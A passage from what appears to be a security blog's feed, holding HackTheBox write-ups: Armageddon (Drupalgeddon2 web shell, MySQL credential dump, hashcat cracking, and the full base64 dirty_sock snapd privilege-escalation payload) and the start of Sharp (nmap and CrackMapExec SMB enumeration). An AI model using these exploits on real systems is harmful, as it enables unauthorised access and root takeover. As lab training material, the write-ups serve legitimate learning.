+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;$ ruby drupalgeddon2.rb 10.10.10.233  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-28_13-18.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;And we get our RCE endpoint at &lt;code&gt;http://armageddon.htb/shell.php?c=&amp;lt;command&amp;gt;&lt;/code&gt;. Since the shell from Drupalgeddon2 is not flexible so I upload another one that includes a superb UI - &lt;a href=&#34;https://github.com/flozz/p0wny-shell&#34;&gt;p0wny-shell&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-27_14-05.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;getting-user-level-credentials-via-mysql&#34;&gt;Getting user-level credentials via MySQL&lt;/h3&gt;
+&lt;p&gt;Inspecting &lt;code&gt;./sites/default/settings.php&lt;/code&gt; gives us our credential for the MySQL database running on the machine&amp;rsquo;s local host.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-28_13-21.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;$databases &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt; (
+  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;default&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt;
+  &lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt; (
+    &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;default&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt;
+    &lt;span style=&#34;color:#66d9ef&#34;&gt;array&lt;/span&gt; (
+      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;database&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;drupal&amp;#39;&lt;/span&gt;,
+      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;username&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;drupaluser&amp;#39;&lt;/span&gt;,
+      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;password&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;CQHEy@9M*m23gBVj&amp;#39;&lt;/span&gt;,
+      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;host&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;localhost&amp;#39;&lt;/span&gt;,
+      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;port&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;,
+      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;driver&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;mysql&amp;#39;&lt;/span&gt;,
+      &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;prefix&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;,
+    ),
+  ),
+);
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Using above credentials to list all tables in the &lt;code&gt;drupal&lt;/code&gt; database and &lt;code&gt;users&lt;/code&gt; is the most conspicuous one here.&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s dump all data in the &lt;code&gt;users&lt;/code&gt; table with following command:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;$ mysql --user&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;drupaluser --password&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;CQHEy@9M*m23gBVj -D drupal -e &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;select name,pass from users;&amp;#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-28_13-22.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;And we have it as &lt;code&gt;brucetherealadmin	$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Next we want to use &lt;code&gt;hashid&lt;/code&gt; to identify the hash type then pass it to &lt;code&gt;hashcat&lt;/code&gt; to crack it.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/HackTheBox/Armageddon&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─$ echo -n &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt&amp;#39;&lt;/span&gt; | sudo tee brucetherealadmin.hash
+$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt                   
+┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/HackTheBox/Armageddon&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─$ hashid brucetherealadmin.hash
+
+--File &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;brucetherealadmin.hash&amp;#39;&lt;/span&gt;--
+Analyzing &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt&amp;#39;&lt;/span&gt;
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Drupal &amp;gt; v7.x 
+--End of file &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;brucetherealadmin.hash&amp;#39;&lt;/span&gt;--                                                                          
+┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;kali㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/HackTheBox/Armageddon&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─$ sudo hashcat -a &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; -m &lt;span style=&#34;color:#ae81ff&#34;&gt;7900&lt;/span&gt; brucetherealadmin.hash /usr/share/wordlists/rockyou.txt  
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Finally, we acquired the password &lt;code&gt;brucetherealadmin:booboo&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-28_13-24.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;privilege-escalation&#34;&gt;Privilege Escalation&lt;/h2&gt;
+&lt;p&gt;We are now able to ssh into 10.10.10.233 using the newly obtained credentials and grab our user flag. I also tried login as &lt;code&gt;brucetherealadmin&lt;/code&gt; on the webpage but found nothing that worth attention.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;brucetherealadmin@armageddon ~&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;$ ls
+user.txt
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;brucetherealadmin@armageddon ~&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;$ cat user.txt 
+9583f911b01bfc2c80d1216707XXXXXX
+&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;brucetherealadmin@armageddon ~&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;$ 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In this escalation phase, first we need to know what &lt;code&gt;brucetherealadmin&lt;/code&gt; can do.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-28_13-25.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;We are able to run &lt;code&gt;/usr/bin/snap install *&lt;/code&gt; as superuser. We also have snap&amp;rsquo;s version as following:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;brucetherealadmin@armageddon ~&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;$ snap version
+snap    2.47.1-1.el7
+snapd   2.47.1-1.el7
+series  &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;
+centos  &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;
+kernel  3.10.0-1160.6.1.el7.x86_64
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After a quick search about &lt;em&gt;snapcraft&lt;/em&gt;, &lt;a href=&#34;https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html&#34;&gt;this&lt;/a&gt; will help us exploit and do a privesc. They also have a TL;DR for us to understand the vulnerability.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;snapd serves up a REST API attached to a local UNIX_AF socket. Access control to restricted API functions is accomplished by querying the UID associated with any connections made to that socket. User-controlled socket peer data can be affected to overwrite a UID variable during string parsing in a for-loop. This allows any user to access any API function&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Describe in basic terms, snapd service allows attacker to add a new user with sudo privilege, in this case is &lt;code&gt;dirty_sock:dirty_sock&lt;/code&gt;, by installing our malicious &lt;code&gt;.snap&lt;/code&gt; package.&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s reproduce the PoC code as below:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ python3 -c &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;print((&amp;#39;&amp;#39;&amp;#39;                                                                    130 ⨯
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&amp;#39;&amp;#39;&amp;#39;
+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;               + &amp;#39;A&amp;#39; * 4256 + &amp;#39;==&amp;#39;))&amp;#34;&lt;/span&gt; | base64 -d | tee poc.snap
+
+$ sudo snap install poc.snap
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Run the code then do a check in &lt;code&gt;/etc/passwd&lt;/code&gt; to see whether our exploit works.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-28_13-29.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Switch to &lt;code&gt;dirty_sock&lt;/code&gt; with &lt;code&gt;dirty_sock&lt;/code&gt; as password and spawn our root shell then achieve the machine flag.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/legiahuyy/image-host/main/2021-5-27-HTB-Armageddon/2021-05-28_13-30.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>HackTheBox: Sharp</title>
+      <link>/posts/htb-sharp/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/htb-sharp/</guid>
+      <description>Hi, after a long time not posting anything on this blog because of my university workload. Let&amp;rsquo;s get back to our normal routine of pwning. Today, I will do a writeup of retired HackTheBox (HTB) machine - Sharp, which is rated 4.8 pts.
+For anyone who doesn&amp;rsquo;t know about HTB, it&amp;rsquo;s an infosec playground with a bunch of virtual machines which are vulnerable to exploit. HTB, in my point of view, is the most practical cyber security competition as many certificate authorities require completion of HTB-like target machines.</description>
+      <content>&lt;p&gt;Hi, after a long time not posting anything on this blog because of my university workload. Let&amp;rsquo;s get back to our normal routine of pwning. Today, I will do a writeup of retired &lt;a href=&#34;https://www.hackthebox.eu/&#34;&gt;HackTheBox&lt;/a&gt; (HTB) machine - Sharp, which is rated 4.8 pts.&lt;/p&gt;
+&lt;p&gt;For anyone who doesn&amp;rsquo;t know about HTB, it&amp;rsquo;s an infosec playground with a bunch of virtual machines which are vulnerable to exploit. HTB, in my point of view, is the most practical cyber security competition as many certificate authorities require completion of HTB-like target machines.&lt;/p&gt;
+&lt;h2 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h2&gt;
+&lt;p&gt;On the very first step, we want to do a nmap scan on the target (10.10.10.219).&lt;/p&gt;
+&lt;h3 id=&#34;nmap-output&#34;&gt;Nmap output&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Nmap 7.91 scan initiated Thu May 13 05:42:14 2021 as: nmap -sC -sV -oA nmap/sharp -v 10.10.10.219&lt;/span&gt;
+
+Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.10.10.219
+Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.23s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;996&lt;/span&gt; filtered ports
+PORT     STATE SERVICE            VERSION
+135/tcp  open  msrpc              Microsoft Windows RPC
+139/tcp  open  netbios-ssn        Microsoft Windows netbios-ssn
+445/tcp  open  microsoft-ds?
+8888/tcp open  storagecraft-image StorageCraft Image Manager
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: -48m56s
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-05-13T08:54:52
+|_  start_date: N/A
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+
+Nmap &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt; at Thu May &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt; 05:44:27 &lt;span style=&#34;color:#ae81ff&#34;&gt;2021&lt;/span&gt; -- &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; IP address &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; host up&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; scanned in 133.29 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Nmap results provide us with different ports and services currently running on the remote host. However, we probably should focus on its SMB service.&lt;/p&gt;
+&lt;h3 id=&#34;in-depth-enumeration-with-crackmapexec-cme&#34;&gt;In-depth enumeration with CrackMapExec (CME)&lt;/h3&gt;
+&lt;p&gt;Instead of the old-fashioned Metasploit&amp;rsquo;s auxiliaries/scanners, CrackMapExec (CME) can help us empower our exploitation to a new level. You can install the tool with a single line&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;$ apt-get install crackmapexec
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;or you can have it by cloning into &lt;a href=&#34;https://github.com/byt3bl33d3r&#34;&gt;byt3bl33d3r&lt;/a&gt;/&lt;strong&gt;&lt;a href=&#34;https://github.com/byt3bl33d3r/CrackMapExec&#34;&gt;CrackMapExec&lt;/a&gt;&lt;/strong&gt; but you will need &lt;a href=&#34;https://python-poetry.org/docs/#installation&#34;&gt;Poetry&lt;/a&gt; to manage dependencies.&lt;/p&gt;
+&lt;h4 id=&#34;os-version&#34;&gt;OS version&lt;/h4&gt;
+&lt;p&gt;Now, let&amp;rsquo;s check our target&amp;rsquo;s OS version using CME (Windows 10.0 Build 17763 x64).&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root💀kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;/home/…/HackTheBox/Sharp/opt/CrackMapExec&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─# poetry run crackmapexec.spec smb 10.10.10.219         
+SMB         10.10.10.219    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    SHARP            &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Windows 10.0 Build &lt;span style=&#34;color:#ae81ff&#34;&gt;17763&lt;/span&gt; x64 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;name:SHARP&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;domain:Sharp&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;signing:False&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;shared-objects--access&#34;&gt;Shared objects &amp;amp; Access&lt;/h4&gt;
+&lt;p&gt;Next, I&amp;rsquo;d like to login using empty username and password, a null-session, to get some free share-objects on the machine.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root💀kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;/home/…/HackTheBox/Sharp/opt/CrackMapExec&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+└─# poetry run crackmapexec.spec smb 10.10.10.219 -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; -p &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt; --shares  
+SMB         10.10.10.219    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    SHARP            &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;*&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Windows 10.0 Build &lt;span style=&#34;color:#ae81ff&#34;&gt;17763&lt;/span&gt; x64 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;name:SHARP&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;domain:Sharp&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;signing:False&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;SMBv1:False&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+SMB         10.10.10.219    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    SHARP            &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Sharp&lt;span style=&#34;color:#ae81ff&#34;&gt;\:&lt;/span&gt; STATUS_ACCESS_DENIED 
+SMB         10.10.10.219    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    SHARP            &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Enumerated shares
+SMB         10.10.10.219    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    SHARP            Share           Permissions     Remark
+SMB         10.10.10.219    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    SHARP            -----           -----------     ------
+SMB         10.10.10.219    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    SHARP            ADMIN$                          Remote Admin
+SMB         10.10.10.219    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    SHARP            C$                              Default share
+SMB         10.10.10.219    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    SHARP            dev                             
+SMB         10.10.10.219    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    SHARP            IPC$                            Remote IPC
+SMB         10.10.10.219    &lt;span style=&#34;color:#ae81ff&#34;&gt;445&lt;/span&gt;    SHARP            kanban          READ            
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The most notable one here is the &lt;code&gt;kanban&lt;/code&gt; share-directory because we don&amp;rsquo;t know what that is, indeed. A quick search on Google provides us that Kanban is a project management framework between users so that we can figure out it might contain important credentials.&lt;/p&gt;
+&lt;h4 id=&#34;spider_plus-json&#34;&gt;Spider_plus JSON&lt;/h4&gt;
+&lt;p&gt;Another thing you can do with CME is using its modules, in this case is &lt;code&gt;spider_plus&lt;/code&gt; to crawl information from target host (directories, file names, sizes, &amp;hellip;) and save it as JSON under &lt;code&gt;/tmp/cme_spider_plus&lt;/code&gt;.&lt;/p&gt;
